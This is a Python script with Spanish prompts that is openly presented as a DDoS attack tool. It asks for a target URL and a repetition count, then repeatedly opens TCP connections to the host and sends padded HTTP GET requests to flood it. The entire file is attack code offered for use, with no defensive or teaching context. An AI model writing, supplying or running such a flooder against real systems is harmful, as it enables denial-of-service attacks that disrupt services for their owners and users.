import socket
import urllib.parse

def ddos_attack():
    try:
        respuesta = input("¿Desea realizar un ataque DDoS? (s/n): ")

        if respuesta.lower() == "s":
            url = input("Ingresa la URL completa del host: ")
            parsed_url = urllib.parse.urlparse(url)
            host = parsed_url.hostname
            port = parsed_url.port

            if port is None:
                port = 443 if parsed_url.scheme == "https" else 80

            inet_address = socket.gethostbyname(host)

            repeticiones = int(input("Ingresa el número de repeticiones: "))

            for _ in range(repeticiones):
                with socket.create_connection((inet_address, port)) as s:
                    requestData = "X" * 1024
                    request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
                    payload = request + requestData

                    s.sendall(payload.encode())

    except urllib.error.URLError as e:
        print("URL inválida:", url)
        print(e)
    except (socket.error, ValueError, KeyboardInterrupt) as e:
        print(f"Ocurrió un error: {e}")

def ddos_attack_main():
    ddos_attack()
